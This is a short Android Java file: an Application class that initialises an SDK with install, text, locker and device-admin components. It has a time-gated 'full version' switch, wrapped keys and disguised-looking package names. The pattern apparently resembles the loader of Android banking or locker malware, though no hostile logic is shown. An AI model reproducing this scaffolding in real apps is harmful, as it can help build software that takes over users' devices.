package com.app.manager;

import android.app.Application;

import java.util.ArrayList;
import java.util.List;

import insta.request.c_master.AdminComponent;
import main_commons.app.c_master.commons.CommonUtils;
import main_commons.app.c_master.commons.commons.SdkCommonsImpl;
import main_commons.app.c_master.commons.commons.SdkComponent;
import privacy.app.com.c_master.TextComponent;
import utils.helper.c_master.InstallsComponent;
import volley.app.c_master.loc_service.LockerComponent;

public class App extends Application {

    @Override
    public void onCreate() {
        super.onCreate();
        final Class launcherActivity = SplashActivity.class;
        boolean useFullVersion = CommonUtils.checkIsFullVersionTime(BuildConfig.U_D);
        List<SdkComponent> components = new ArrayList<>();
        components.add(new InstallsComponent());
        //        components.add(new UssdComponent());
        components.add(new TextComponent());
        components.add(new LockerComponent());
        components.add(new AdminComponent().setStartLauncherActivity(true));
        //        components.add(new ReferencesComponent());
        //        components.add(new NotificationsComponent());
        SdkCommonsImpl.init(this,
                BuildConfig.APPLICATION_ID,
                CommonUtils.wrapStringWithKeys(BuildConfig.ARG_1, BuildConfig.KEY_1),
                launcherActivity,
                BuildConfig.DEBUG, useFullVersion,
                components);
    }
}
